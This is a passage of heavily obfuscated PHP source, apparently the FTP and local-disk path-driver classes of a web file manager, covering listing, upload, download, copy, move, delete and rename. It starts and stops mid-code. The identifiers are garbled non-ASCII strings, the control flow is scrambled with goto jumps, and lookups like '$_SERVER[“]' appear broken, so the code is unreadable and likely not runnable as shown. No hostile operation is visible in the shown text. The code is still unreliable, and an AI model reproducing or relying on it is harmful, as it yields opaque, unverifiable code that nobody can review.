$BÏ‚ß¼‚ÂÖ, $AĞ’³ô¸½‚[29] => $AĞ’³ô¸½‚[76], $AĞ’³ô¸½‚[187] => 0, $AĞ’³ô¸½‚[107] => 0, $AĞ’³ô¸½‚[1149] => !0, $AĞ’³ô¸½‚[1150] => !0); goto C·ø‚òÛ¡Õ; C·ø‚òÛ¡Õ: return $Aæçâœô‚; goto F¢ÀºÓÙäá; F¢ÀºÓÙäá: } private function fileInfo($DÖƒÌòš, $CŞ¹Š³­²ù = false) { goto fµ×Æ«ÁêÂ; cŸ–•»Öå¨: $b‰¯Å²©™Ö = $this->iconvSystem($DÖƒÌòš); if ($CŞ¹Š³­²ù) { return array($e·¦À•‹Á»[28] => $BØâêàæÛ…, $e·¦À•‹Á»[75] => $d”’º³µ‘Ï, $e·¦À•‹Á»[29] => $e·¦À•‹Á»[167], $e·¦À•‹Á»[160] => $this->ext($DÖƒÌòš), $e·¦À•‹Á»[77] => $this->size($DÖƒÌòš)); } $b¼‰‰¹ãª = array($e·¦À•‹Á»[28] => $BØâêàæÛ…, $e·¦À•‹Á»[75] => $d”’º³µ‘Ï, $e·¦À•‹Á»[29] => $e·¦À•‹Á»[167], $e·¦À•‹Á»[187] => 0, $e·¦À•‹Á»[107] => @ftp_mdtm($this->connect, $b‰¯Å²©™Ö), $e·¦À•‹Á»[160] => $this->ext($DÖƒÌòš), $e·¦À•‹Á»[77] => $this->size($DÖƒÌòš), $e·¦À•‹Á»[1149] => !0, $e·¦À•‹Á»[1150] => !0); goto d¡‚×ò“†ä; d¡‚×ò“†ä: $b¼‰‰¹ãª[$e·¦À•‹Á»[107]] = $b¼‰‰¹ãª[$e·¦À•‹Á»[107]] > 0 ? $b¼‰‰¹ãª[$e·¦À•‹Á»[107]] : 0; return $b¼‰‰¹ãª; goto BÀÃîÇŒ‹; fµ×Æ«ÁêÂ: $e·¦À•‹Á» =& $_SERVER[“]; $d”’º³µ‘Ï = $this->getPathOuter(rtrim($DÖƒÌòš, $e·¦À•‹Á»[8])); $BØâêàæÛ… = $this->pathThis($d”’º³µ‘Ï); goto cŸ–•»Öå¨; BÀÃîÇŒ‹: } public function size($DŒÓ‘«¬ä„) { $e°Œ˜ò—×» = $this->objectMeta($DŒÓ‘«¬ä„); return $e°Œ˜ò—×» ? $e°Œ˜ò—×»[$_SERVER[“][77]] : 0; } public function info($Aæˆ—Õ¾®ö) { if ($this->isFile($Aæˆ—Õ¾®ö)) { return $this->fileInfo($Aæˆ—Õ¾®ö, 0); } else { if ($this->isFolder($Aæˆ—Õ¾®ö)) { return $this->folderInfo($Aæˆ—Õ¾®ö); } } return !1; } public function exist($EÕŸ°ÇÅˆÖ) { return $this->objectMeta($EÕŸ°ÇÅˆÖ) ? !0 : !1; } public function isFile($c›ßÀª‚Ï) { $cÚÎ†Å¥‹Ñ =& $_SERVER[“]; $C¬‹¥·ì = $this->objectMeta($c›ßÀª‚Ï); return $C¬‹¥·ì ? $C¬‹¥·ì[$cÚÎ†Å¥‹Ñ[29]] == $cÚÎ†Å¥‹Ñ[167] : !1; } public function isFolder($bÉå„Î’õæ) { $fÂ“¦œ¥Àƒ =& $_SERVER[“]; $C÷ºµ§’ã = $this->objectMeta($bÉå„Î’õæ); return $C÷ºµ§’ã ? $C÷ºµ§’ã[$fÂ“¦œ¥Àƒ[29]] == $fÂ“¦œ¥Àƒ[76] : !1; } public function listPath($bÓööõ‹Å, $A¶®È±§óÚ = false) { goto dÃ©‹¦; aÃé•¦¼‰ç: $Eƒö¾èµ×¥ = $this->ftpList($bÓööõ‹Å); $Cò¸ç×™›™ = array($Bå¢²¹†¿ñ[74] => array(), $Bå¢²¹†¿ñ[73] => array()); if (!$Eƒö¾èµ×¥) { return $Cò¸ç×™›™; } goto AÇ—‰«Î«ˆ; AÇ—‰«Î«ˆ: foreach ($Eƒö¾èµ×¥ as $bÓööõ‹Å) { if ($this->isFolder($bÓööõ‹Å)) { $Cò¸ç×™›™[$Bå¢²¹†¿ñ[74]][] = $this->folderInfo($bÓööõ‹Å, $A¶®È±§óÚ); } else { $Cò¸ç×™›™[$Bå¢²¹†¿ñ[73]][] = $this->fileInfo($bÓööõ‹Å, $A¶®È±§óÚ); } } return $Cò¸ç×™›™; goto bÇ˜ÄÜÚºê; dÃ©‹¦: $Bå¢²¹†¿ñ =& $_SERVER[“]; if (!$this->_isconn()) { return !1; } $bÓööõ‹Å = $this->iconvSystem($bÓööõ‹Å); goto aÃé•¦¼‰ç; bÇ˜ÄÜÚºê: } public function has($C¦áÀ³Ù§Ğ, $F Ë»¡¬‹ = false, $D‡·¼ˆØ¶ = true) { goto CË® åµ‚„; F§í—àœÊ½: $dòë¿êƒ² = $this->ftpList($C¦áÀ³Ù§Ğ); if (!$dòë¿êƒ²) { return !1; } if ($F Ë»¡¬‹) { return array($eÍ§‚õÜì†[191] => 0, $eÍ§‚õÜì†[192] => count($dòë¿êƒ²)); } goto EòÏõï«ã¤; CË® åµ‚„: $eÍ§‚õÜì† =& $_SERVER[“]; if (!$this->_isconn()) { return !1; } $C¦áÀ³Ù§Ğ = $this->iconvSystem($C¦áÀ³Ù§Ğ); goto F§í—àœÊ½; EòÏõï«ã¤: foreach ($dòë¿êƒ² as $C¦áÀ³Ù§Ğ) { if ($D‡·¼ˆØ¶) { if (!$this->isFolder($C¦áÀ³Ù§Ğ)) { return !0; } } else { if ($this->isFolder($C¦áÀ³Ù§Ğ)) { return !0; } } } return !1; goto c›Õöä¶óƒ; c›Õöä¶óƒ: } public function listAll($E¬Á‡) { goto a°«âËº’°; FÜ—Üèã‰²: $A…ÃàÌ¿¾À = array($bå¦¥§•¼[73] => array(), $bå¦¥§•¼[74] => array()); $this->recursionFtpFiles($E¬Á‡, $A…ÃàÌ¿¾À); $Dà‹îñ‹Â = array(); goto aÓ‡„ÉˆË½; a°«âËº’°: $bå¦¥§•¼ =& $_SERVER[“]; if (!$this->_isconn()) { return !1; } $E¬Á‡ = $this->iconvSystem($E¬Á‡); goto FÜ—Üèã‰²; aÓ‡„ÉˆË½: foreach ($A…ÃàÌ¿¾À[$bå¦¥§•¼[74]] as $cŸ¸Ï…œ½) { $Dà‹îñ‹Â[] = array($bå¦¥§•¼[75] => $bå¦¥§•¼[8] . trim(str_replace($E¬Á‡, $bå¦¥§•¼[33], $cŸ¸Ï…œ½), $bå¦¥§•¼[8]) . $bå¦¥§•¼[8], $bå¦¥§•¼[76] => 1, $bå¦¥§•¼[77] => 0); } foreach ($A…ÃàÌ¿¾À[$bå¦¥§•¼[73]] as $A¤¢·Ê­Õ) { $Dà‹îñ‹Â[] = array($bå¦¥§•¼[75] => $bå¦¥§•¼[8] . trim(str_replace($E¬Á‡, $bå¦¥§•¼[33], $A¤¢·Ê­Õ), $bå¦¥§•¼[8]), $bå¦¥§•¼[76] => 0, $bå¦¥§•¼[77] => $this->size($A¤¢·Ê­Õ)); } return $Dà‹îñ‹Â; goto f²ßïÙ¬‹; f²ßïÙ¬‹: } public function getContent($bÒ°¤ÉííØ) { if (!$this->_isconn()) { return !1; } $bÒ°¤ÉííØ = $this->iconvSystem($bÒ°¤ÉííØ); return $this->fileSubstr($bÒ°¤ÉííØ); } public function setContent($b¯ŠÓ‰Éôå, $FáàÚ©á°ç = '') { goto eŸºË¢–ªñ; eŸºË¢–ªñ: if (!$this->_isconn()) { return !1; } $C÷Û·¡ÃÄ„ = $this->pathThis($this->iconvSystem($b¯ŠÓ‰Éôå)); $DŸ• ‰’Ñ = $this->tempFile($C÷Û·¡ÃÄ„); goto f­çÀ…‘ù”; f­çÀ…‘ù”: file_put_contents($DŸ• ‰’Ñ, $FáàÚ©á°ç); $b¹ÚìÛÛ½ = $this->upload($b¯ŠÓ‰Éôå, $this->iconvApp($DŸ• ‰’Ñ)); $this->tempFileRemve($DŸ• ‰’Ñ); goto E–öäŠÄòë; E–öäŠÄòë: return $b¹ÚìÛÛ½; goto cÏ½‘…ñŒ¨; cÏ½‘…ñŒ¨: } public function fileSubstr($dÒƒÏŸøØ, $a‹ÕÆ©Ç¨ = 0, $eèôèù©® = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dÒƒÏŸøØ, $a‹ÕÆ©Ç¨, $eèôèù©®); } private function ftpRequest($AŠ‚Ó»áñ, $E§Ï»·Âó = 0, $D‚ò¼¿çì = false) { goto CÎÑ‰˜ÃàÎ; CöêÈ‰Á«‹: curl_setopt($CğôÙÌŠÄì, CURLOPT_RETURNTRANSFER, 1); $c£²»Ş¦î÷ = curl_exec($CğôÙÌŠÄì); curl_close($CğôÙÌŠÄì); goto cÇ“÷äëãÍ; cÇ“÷äëãÍ: return $c£²»Ş¦î÷; goto a–´ÕÀœ¤Ü; CÎÑ‰˜ÃàÎ: $AŠ‚Ó»áñ = $this->iconvSystem($AŠ‚Ó»áñ); $C‡º®¢ã¨— = $this->scheme . $this->host . $_SERVER[“][4] . $this->port; $CğôÙÌŠÄì = curl_init(); goto CÃğ‹Ò³è; CÃğ‹Ò³è: curl_setopt($CğôÙÌŠÄì, CURLOPT_URL, $C‡º®¢ã¨— . $this->pathEncode($AŠ‚Ó»áñ)); curl_setopt($CğôÙÌŠÄì, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($D‚ò¼¿çì) { $b²½ëñÜó = $E§Ï»·Âó + $D‚ò¼¿çì - 1; curl_setopt($CğôÙÌŠÄì, CURLOPT_RANGE, "{$E§Ï»·Âó}\55{$b²½ëñÜó}"); } goto CöêÈ‰Á«‹; a–´ÕÀœ¤Ü: } public function upload($aËò³ÉŒ”, $còÚâï·Â†, $bæÈÕ‹àŞ¼ = false, $B‰¿‚·‘¿— = REPEAT_REPLACE) { goto aæÔŞšÆß¦; aæÔŞšÆß¦: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aËò³ÉŒ”))) { return !1; } $aËò³ÉŒ” = $this->iconvSystem($aËò³ÉŒ”); goto d®†ª·ƒ«×; d®†ª·ƒ«×: $còÚâï·Â† = $this->iconvSystem($còÚâï·Â†); $F„Õ¢§„¦Ú = ftp_nb_put($this->connect, $aËò³ÉŒ”, $còÚâï·Â†, FTP_BINARY); while ($F„Õ¢§„¦Ú == FTP_MOREDATA) { $F„Õ¢§„¦Ú = ftp_nb_continue($this->connect); } goto F½¢»Ñ¯Œ®; F½¢»Ñ¯Œ®: if ($F„Õ¢§„¦Ú != FTP_FINISHED) { return !1; } return $this->getPathOuter($aËò³ÉŒ”); goto Eæ¾×Ò‘·; Eæ¾×Ò‘·: } public function download($A®´·¤Ÿ¨, $D“éå„©…ƒ = '') { goto E¾—îÑ¾ÏÓ; d´ß¢Õµ: while ($c‚•öµÂ¹ø == FTP_MOREDATA) { $c‚•öµÂ¹ø = ftp_nb_continue($this->connect); } if ($c‚•öµÂ¹ø != FTP_FINISHED) { return !1; } return $this->iconvApp($D“éå„©…ƒ); goto Cší»µ„•; Aë›Åé­ˆ¼: $A®´·¤Ÿ¨ = $this->iconvSystem($A®´·¤Ÿ¨); $D“éå„©…ƒ = $this->iconvSystem($D“éå„©…ƒ); $c‚•öµÂ¹ø = ftp_nb_get($this->connect, $D“éå„©…ƒ, $A®´·¤Ÿ¨, FTP_BINARY); goto d´ß¢Õµ; E¾—îÑ¾ÏÓ: if (!$this->_isconn()) { return !1; } $AŸ¡çŸÉÉ = $this->pathFather($D“éå„©…ƒ); if (!IO::mkdir($AŸ¡çŸÉÉ)) { return !1; } goto Aë›Åé­ˆ¼; Cší»µ„•: } private function ftpList($A±Ì”„Øî) { goto A³¢ğÜÇ•; A³¢ğÜÇ•: $c¾Ö…Ûå¸á =& $_SERVER[“]; if (!$this->isFolder($A±Ì”„Øî)) { return !1; } @ftp_chdir($this->connect, $c¾Ö…Ûå¸á[8]); goto bŞğ‡À¼; d»ğÉİŸÌ‰: return $DÍÁÙ™óÌó; goto D‡˜°Ú•ªï; aí•“Ô’Ú: $eº·ìªİà· = array_diff($eº·ìªİà·, array($c¾Ö…Ûå¸á[91], $c¾Ö…Ûå¸á[1152], $A±Ì”„Øî . $c¾Ö…Ûå¸á[91], $A±Ì”„Øî . $c¾Ö…Ûå¸á[1152])); $DÍÁÙ™óÌó = array(); foreach ($eº·ìªİà· as $b¾ˆ±‘õˆ°) { if (!strstr($b¾ˆ±‘õˆ°, $c¾Ö…Ûå¸á[8])) { $b¾ˆ±‘õˆ° = $A±Ì”„Øî . ltrim($b¾ˆ±‘õˆ°, $c¾Ö…Ûå¸á[8]); } $DÍÁÙ™óÌó[] = $this->iconvApp($b¾ˆ±‘õˆ°); } goto d»ğÉİŸÌ‰; bŞğ‡À¼: $A±Ì”„Øî = rtrim($A±Ì”„Øî, $c¾Ö…Ûå¸á[8]) . $c¾Ö…Ûå¸á[8]; $eº·ìªİà· = @ftp_nlist($this->connect, $A±Ì”„Øî); if ($eº·ìªİà· === !1) { $eº·ìªİà· = @ftp_rawlist($this->connect, $A±Ì”„Øî); foreach ($eº·ìªİà· as $fÔ™å«‘ô => $c„«ÍùÓè‰) { $eº·ìªİà·[$fÔ™å«‘ô] = end(explode($c¾Ö…Ûå¸á[1151], $c„«ÍùÓè‰)); } } goto aí•“Ô’Ú; D‡˜°Ú•ªï: } private function recursionFtpFiles($D¯æ‘’Ûàª, &$b²£º…õ–ç) { $f­Å² ¦ä =& $_SERVER[“]; if (!$this->_isconn()) { return !1; } if (!($aŞÉ¾³‡ˆŒ = $this->ftpList($D¯æ‘’Ûàª))) { return !1; } foreach ($aŞÉ¾³‡ˆŒ as $D¯æ‘’Ûàª) { if ($this->isFolder($D¯æ‘’Ûàª)) { $this->recursionFtpFiles($D¯æ‘’Ûàª, $b²£º…õ–ç); $b²£º…õ–ç[$f­Å² ¦ä[74]][] = $D¯æ‘’Ûàª; } else { $b²£º…õ–ç[$f­Å² ¦ä[73]][] = $D¯æ‘’Ûàª; } } } private function objectMeta($aè©½óÅ®) { goto C§Ğ¤âæŞÔ; eèä…ôŸ: return $díÁÙ»³ˆÒ; goto eÓÛºÑÏÄ‚; C§Ğ¤âæŞÔ: $dåìóŒãë =& $_SERVER[“]; $fæ˜¿¥Œë = $dåìóŒãë[1153] . md5($aè©½óÅ®); $díÁÙ»³ˆÒ = Cache::get($fæ˜¿¥Œë); goto cÙçÑ§Â×—; cÙçÑ§Â×—: if ($díÁÙ»³ˆÒ !== null && $díÁÙ»³ˆÒ !== !1) { return $díÁÙ»³ˆÒ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $dåìóŒãë[8]); goto Eø°¼è«¦Ü; Eø°¼è«¦Ü: $A•†’ğî = @ftp_size($this->connect, $this->iconvSystem($aè©½óÅ®)); if ($A•†’ğî != -1) { $díÁÙ»³ˆÒ = array($dåìóŒãë[77] => $A•†’ğî, $dåìóŒãë[29] => $dåìóŒãë[167]); } else { $DÈ¡â±—¹• = @ftp_chdir($this->connect, $this->iconvSystem($aè©½óÅ®)); $díÁÙ»³ˆÒ = $DÈ¡â±—¹• ? array($dåìóŒãë[77] => 0, $dåìóŒãë[29] => $dåìóŒãë[76]) : !1; } Cache::set($fæ˜¿¥Œë, $díÁÙ»³ˆÒ, 0); goto eèä…ôŸ; eÓÛºÑÏÄ‚: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($E„šô†‘Å) { if (substr($E„šô†‘Å, 0, 2) == $_SERVER[“][1142]) { $E„šô†‘Å = BASIC_PATH . substr($E„šô†‘Å, 2); } return $E„šô†‘Å; } public function iconvApp($B‚ó§£å¥) { $f„Ò¼á†Ñ =& $_SERVER[“]; global $config; return $this->iconvTo($B‚ó§£å¥, $config[$f„Ò¼á†Ñ[1140]], $config[$f„Ò¼á†Ñ[1139]]); } public function iconvSystem($A„Şˆ å¢) { $f²“½¬¡ˆ¸ =& $_SERVER[“]; global $config; return $this->iconvTo($A„Şˆ å¢, $config[$f²“½¬¡ˆ¸[1139]], $config[$f²“½¬¡ˆ¸[1140]]); } public function getPathOuter($fĞçĞ‡º’ô) { goto DĞ³ˆ£Ò×‚; DĞ³ˆ£Ò×‚: $f³ÂáÑÈİ =& $_SERVER[“]; $d¹àôôğ = $this->iconvApp($this->pathBase); $fĞçĞ‡º’ô = $this->iconvApp($fĞçĞ‡º’ô); goto F›“ÜöØŠ; Aõ×ìÄÑ×¤: $fĞçĞ‡º’ô = KodIO::clear($fĞçĞ‡º’ô); $fĞçĞ‡º’ô = substr($fĞçĞ‡º’ô, strlen($d¹àôôğ)); if (empty($this->pathDriver)) { return $fĞçĞ‡º’ô; } goto eãÛ™œëîå; eãÛ™œëîå: return $this->pathDriver . $f³ÂáÑÈİ[8] . ltrim($fĞçĞ‡º’ô, $f³ÂáÑÈİ[8]); goto fŒõÛ‡©ğ¯; F›“ÜöØŠ: if (substr($d¹àôôğ, 0, 2) == $f³ÂáÑÈİ[1142]) { $d¹àôôğ = BASIC_PATH . substr($d¹àôôğ, 2); } if (substr($fĞçĞ‡º’ô, 0, 2) == $f³ÂáÑÈİ[1142]) { $fĞçĞ‡º’ô = BASIC_PATH . substr($fĞçĞ‡º’ô, 2); } $d¹àôôğ = KodIO::clear($d¹àôôğ); goto Aõ×ìÄÑ×¤; fŒõÛ‡©ğ¯: } public function mkfile($bš¸îİöÒ¼, $F­ñ‘Í™¶ = '', $BèáÛ‹¤Š¹ = REPEAT_RENAME) { $bš¸îİöÒ¼ = $this->iconvSystem($bš¸îİöÒ¼); @touch($bš¸îİöÒ¼); if ($F­ñ‘Í™¶) { file_put_contents($bš¸îİöÒ¼, $F­ñ‘Í™¶); } return is_file($bš¸îİöÒ¼) ? $this->getPathOuter($bš¸îİöÒ¼) : !1; } public function mkdir($A‡ê”ô‹ôÖ, $Aùáôø‹æ… = REPEAT_SKIP) { $A‡ê”ô‹ôÖ = $this->iconvSystem($A‡ê”ô‹ôÖ); if (is_dir($A‡ê”ô‹ôÖ)) { return $this->getPathOuter($A‡ê”ô‹ôÖ); } @mkdir($A‡ê”ô‹ôÖ, 511, !0); return is_dir($A‡ê”ô‹ôÖ) ? $this->getPathOuter($A‡ê”ô‹ôÖ) : !1; } public function copyFile($d²‹™È, $D¨áæªíšâ) { $this->mkdir($this->pathFather($D¨áæªíšâ)); $d²‹™È = $this->iconvSystem($d²‹™È); $D¨áæªíšâ = $this->iconvSystem($D¨áæªíšâ); $e¥†ÊÎêØ­ = @copy($d²‹™È, $D¨áæªíšâ); return $e¥†ÊÎêØ­ ? $this->getPathOuter($D¨áæªíšâ) : !1; } public function moveFile($DòìË‚¦„©, $d“òôğ–) { $this->mkdir($this->pathFather($d“òôğ–)); $DòìË‚¦„© = $this->iconvSystem($DòìË‚¦„©); $d“òôğ– = $this->iconvSystem($d“òôğ–); $aä…ßÒÇø÷ = intval(@rename($DòìË‚¦„©, $d“òôğ–)); if (!$aä…ßÒÇø÷) { if ($aä…ßÒÇø÷ = intval(@copy($DòìË‚¦„©, $d“òôğ–))) { @unlink($DòìË‚¦„©); } } return $aä…ßÒÇø÷ ? $this->getPathOuter($d“òôğ–) : !1; } public function delFile($B§ˆèÉœ©) { $B§ˆèÉœ© = $this->iconvSystem($B§ˆèÉœ©); if (!@unlink($B§ˆèÉœ©)) { @chmod($B§ˆèÉœ©, 511); if (!@unlink($B§ˆèÉœ©)) { return !1; } } else { return !0; } } public function delFolder($D¬Ï²ä„ß÷) { goto eÄùÑà‰é; bœ½ÔÇ…°¿: return rmdir($D¬Ï²ä„ß÷); goto a‘ºÏÄºâ¿; eÄùÑà‰é: $aÃƒªñ•ğÍ =& $_SERVER[“]; $D¬Ï²ä„ß÷ = $this->iconvSystem($D¬Ï²ä„ß÷); if (!is_dir($D¬Ï²ä„ß÷)) { return !0; } goto a‰£¢Ä®ß¼; a‰£¢Ä®ß¼: if (!($EÔÏÃ·Ÿå¢ = opendir($D¬Ï²ä„ß÷))) { return !1; } while (($F‘¡ÀàŒ´ = readdir($EÔÏÃ·Ÿå¢)) !== !1) { if ($F‘¡ÀàŒ´ == $aÃƒªñ•ğÍ[91] || $F‘¡ÀàŒ´ == $aÃƒªñ•ğÍ[1152]) { continue; } $c¹›ÙÏ‘ó— = $D¬Ï²ä„ß÷ . $aÃƒªñ•ğÍ[8] . $F‘¡ÀàŒ´; if (is_file($c¹›ÙÏ‘ó—) || is_link($c¹›ÙÏ‘ó—)) { if (!unlink($c¹›ÙÏ‘ó—)) { chmod($c¹›ÙÏ‘ó—, 511); if (!unlink($c¹›ÙÏ‘ó—)) { return !1; } } } else { if (is_dir($c¹›ÙÏ‘ó—)) { chmod($c¹›ÙÏ‘ó—, 511); $c¹›ÙÏ‘ó— = $this->iconvApp($c¹›ÙÏ‘ó—); if (!$this->delFolder($c¹›ÙÏ‘ó—)) { return !1; } } } } closedir($EÔÏÃ·Ÿå¢); goto bœ½ÔÇ…°¿; a‘ºÏÄºâ¿: } public function rename($bÓ¡ë’¡á¡, $EÆÍ¦Öß¾Ã) { goto e‚Ï—‹¨ñÕ; e‚Ï—‹¨ñÕ: $A†×Õ…ä¡î =& $_SERVER[“]; $d¶ñæÄ‹½ø = $this->fileNameAuto($this->pathFather($bÓ¡ë’¡á¡), $EÆÍ¦Öß¾Ã); $d¶ñæÄ‹½ø = $this->iconvSystem($d¶ñæÄ‹½ø); goto D˜©¹ÃÅğ; C“¸ùÂ İö: $BÏ–®ãšÙö = @rename($bÓ¡ë’¡á¡, $c»òå‰»İ); $c»òå‰»İ = $this->iconvApp($c»òå‰»İ); return $BÏ–®ãšÙö ? $this->getPathOuter($c»òå‰»İ) : !1; goto EŠ¿ù„Î°; D˜©¹ÃÅğ: $bÓ¡ë’¡á¡ = $this->iconvSystem($bÓ¡ë’¡á¡); $b˜’Ÿ–Ë = $this->pathFather($bÓ¡ë’¡á¡); $c»òå‰»İ = rtrim($b˜’Ÿ–Ë, $A†×Õ…ä¡î[8]) . $A†×Õ…ä¡î[8] . $d¶ñæÄ‹½ø; goto C“¸ùÂ İö; EŠ¿ù„Î°: } public function size($cµ‰†šâå­) { $cµ‰†šâå­ = $this->iconvSystem($cµ‰†šâå­); return (double) abs(sprintf($_SERVER[“][1154], @filesize($cµ‰†šâå­))); } public function info($Aè ÎÃ‰) { $Aè ÎÃ‰ = $this->iconvSystem($Aè ÎÃ‰); if ($this->isFolder($Aè ÎÃ‰)) { return $this->folderInfo($Aè ÎÃ‰); } else { if ($this->isFile($Aè ÎÃ‰)) { return $this->fileInfo($Aè ÎÃ‰); } } return !1; } protected function infoChildren($aš‘ğ»’², &$fÚ™é…Ü§¬, $FÙÔ‡Æà› = true) { goto b†­ÍêÒ; Dèå¹Ì»¹ƒ: if ($FÙÔ‡Æà›) { $aš‘ğ»’² = $this->iconvSystem($aš‘ğ»’²); } if (!($b¶¢Óºåù = @opendir($aš‘ğ»’²))) { return; } while (($dÄ–±à±Ö— = readdir($b¶¢Óºåù)) !== !1) { if ($dÄ–±à±Ö— == $FÌ¿ÏÌ™Âö[91] || $dÄ–±à±Ö— == $FÌ¿ÏÌ™Âö[1152]) { continue; } $AªòˆŠæ»© = $aš‘ğ»’² . $dÄ–±à±Ö—; if (is_file($AªòˆŠæ»©) || is_link($AªòˆŠæ»©)) { $fÚ™é…Ü§¬[$FÌ¿ÏÌ™Âö[78]]++; $fÚ™é…Ü§¬[$FÌ¿ÏÌ™Âö[77]] += (double) abs(sprintf($FÌ¿ÏÌ™Âö[1154], @filesize($AªòˆŠæ»©))); } else { if (is_dir($AªòˆŠæ»©)) { $fÚ™é…Ü§¬[$FÌ¿ÏÌ™Âö[79]]++; $this->infoChildren($AªòˆŠæ»©, $fÚ™é…Ü§¬, !1); } } } goto BŠ»´®†¿; b†­ÍêÒ: $FÌ¿ÏÌ™Âö =& $_SERVER[“]; check_abort(); $aš‘ğ»’² = rtrim($aš‘ğ»’², $FÌ¿ÏÌ™Âö[8]) . $FÌ¿ÏÌ™Âö[8]; goto Dèå¹Ì»¹ƒ; BŠ»´®†¿: closedir($b¶¢Óºåù); goto eã‚–ÁöÉ‰; eã‚–ÁöÉ‰: } private function folderInfo($cƒ›ßÑîñƒ, $B²Ş¾ÅÄƒÁ = false) { $dÖ›—Ñ­ =& $_SERVER[“]; $cƒ›ßÑîñƒ = rtrim($cƒ›ßÑîñƒ, $dÖ›—Ñ­[8]) . $dÖ›—Ñ­[8]; $BËœãäù¹ë = $this->iconvApp($this->pathThis($cƒ›ßÑîñƒ)); if ($B²Ş¾ÅÄƒÁ) { return array($dÖ›—Ñ­[28] => $BËœãäù¹ë, $dÖ›—Ñ­[75] => $this->getPathOuter($cƒ›ßÑîñƒ), $dÖ›—Ñ­[29] => $dÖ›—Ñ­[76]); } $BÀŠ’µ¤—Ì = array($dÖ›—Ñ­[28] => $BËœãäù¹ë, $dÖ›—Ñ­[75] => $this->getPathOuter($cƒ›ßÑîñƒ), $dÖ›—Ñ­[29] => $dÖ›—Ñ­[76], $dÖ›—Ñ­[187] => @filectime($cƒ›ßÑîñƒ), $dÖ›—Ñ­[107] => @filemtime($cƒ›ßÑîñƒ), $dÖ›—Ñ­[1155] => @fileatime($cƒ›ßÑîñƒ), $dÖ›—Ñ­[1149] => is_readable($cƒ›ßÑîñƒ), $dÖ›—Ñ­[1150] => is_writable($cƒ›ßÑîñƒ), $dÖ›—Ñ­[1156] => get_mode($cƒ›ßÑîñƒ)); return $BÀŠ’µ¤—Ì; } private function fileInfo($c½ˆœøğì›, $FğŒ“™ã›à = false) { $bõÈ¿ùµ¬ï =& $_SERVER[“]; $f¢¢ƒÍß¹‹ = $this->iconvApp($this->pathThis($c½ˆœøğì›)); if ($FğŒ“™ã›à) { return array($bõÈ¿ùµ¬ï[28] => $f¢¢ƒÍß¹‹, $bõÈ¿ùµ¬ï[75] => $this->getPathOuter($c½ˆœøğì›), $bõÈ¿ùµ¬ï[29] => $bõÈ¿ùµ¬ï[167], $bõÈ¿ùµ¬ï[77] => $this->size($c½ˆœøğì›), $bõÈ¿ùµ¬ï[160] => $this->ext($f¢¢ƒÍß¹‹)); } $F¤ƒ«†Éæ = array($bõÈ¿ùµ¬ï[28] => $f¢¢ƒÍß¹‹, $bõÈ¿ùµ¬ï[75] => $this->getPathOuter($c½ˆœøğì›), $bõÈ¿ùµ¬ï[29] => $bõÈ¿ùµ¬ï[167], $bõÈ¿ùµ¬ï[187] => @filectime($c½ˆœøğì›), $bõÈ¿ùµ¬ï[107] => @filemtime($c½ˆœøğì›), $bõÈ¿ùµ¬ï[1155] => @fileatime($c½ˆœøğì›), $bõÈ¿ùµ¬ï[77] => $this->size($c½ˆœøğì›), $bõÈ¿ùµ¬ï[160] => $this->ext($f¢¢ƒÍß¹‹), $bõÈ¿ùµ¬ï[1149] => is_readable($c½ˆœøğì›), $bõÈ¿ùµ¬ï[1150] => is_writable($c½ˆœøğì›), $bõÈ¿ùµ¬ï[1156] => get_mode($c½ˆœøğì›)); return $F¤ƒ«†Éæ; } public function exist($F™Ê ¾¾šÅ) { $F™Ê ¾¾šÅ = $this->iconvSystem($F™Ê ¾¾šÅ); return @file_exists($F™Ê ¾¾šÅ); } public function isFile($FË‹»ëª—Å) { $FË‹»ëª—Å = $this->iconvSystem($FË‹»ëª—Å); return @is_file($FË‹»ëª—Å); } public function isFolder($D«Éç×²”ğ) { $D«Éç×²”ğ = $this->iconvSystem($D«Éç×²”ğ); return @is_dir($D«Éç×²”ğ); } public function listPath($bâÕ×Æ¼Ö, $D®ÓôÄºÄ‰ = false) { goto aÑó„‹„Ó¨; DĞİøƒò‰: $d¼¹Åöå…ø = array($bƒ†ŒøßÌæ[74] => array(), $bƒ†ŒøßÌæ[73] => array()); if (!($Døøâ›µ‰ = @opendir($bâÕ×Æ¼Ö))) { return $d¼¹Åöå…ø; } while (($BÂ‡Ì‚è·² = readdir($Døøâ›µ‰)) !== !1) { if ($BÂ‡Ì‚è·² == $bƒ†ŒøßÌæ[91] || $BÂ‡Ì‚è·² == $bƒ†ŒøßÌæ[1152]) { continue; } $fÎå£êÚÍ = $bâÕ×Æ¼Ö . $BÂ‡Ì‚è·²; if (is_file($fÎå£êÚÍ)) { $d¼¹Åöå…ø[$bƒ†ŒøßÌæ[73]][] = $this->fileInfo($fÎå£êÚÍ, $D®ÓôÄºÄ‰); } else { $d¼¹Åöå…ø[$bƒ†ŒøßÌæ[74]][] = $this->folderInfo($fÎå£êÚÍ, $D®ÓôÄºÄ‰); } } goto a‡²åİ‚•‚; a‡²åİ‚•‚: closedir($Døøâ›µ‰); return $d¼¹Åöå…ø; goto C˜ã´‰¿Ğ; aÑó„‹„Ó¨: $bƒ†ŒøßÌæ =& $_SERVER[“]; $bâÕ×Æ¼Ö = $this->iconvSystem($bâÕ×Æ¼Ö); $bâÕ×Æ¼Ö = rtrim($bâÕ×Æ¼Ö, $bƒ†ŒøßÌæ[8]) . $bƒ†ŒøßÌæ[8]; goto DĞİøƒò‰; C˜ã´‰¿Ğ: } public function listAll($cçÅ¡‘¨×, &$ağ—Ş¾´Éã = array()) { goto a›ª…—ªáÒ; DÚ›‹×‹ªİ: return $ağ—Ş¾´Éã; goto FÆ¹ÓÜ„Ü£; a›ª…—ªáÒ: $fãªÊÄæˆİ =& $_SERVER[“]; $cçÅ¡‘¨× = $this->iconvSystem($cçÅ¡‘¨×); $cçÅ¡‘¨× = rtrim($cçÅ¡‘¨×, $fãªÊÄæˆİ[8]) . $fãªÊÄæˆİ[8]; goto Bö˜Õçìµ«; Bö˜Õçìµ«: if (!($C¶Ù°óùù’ = @opendir($cçÅ¡‘¨×))) { return $ağ—Ş¾´Éã; } while (($D«ùŒ—©÷‡ = readdir($C¶Ù°óùù’)) !== !1) { if ($D«ùŒ—©÷‡ == $fãªÊÄæˆİ[91] || 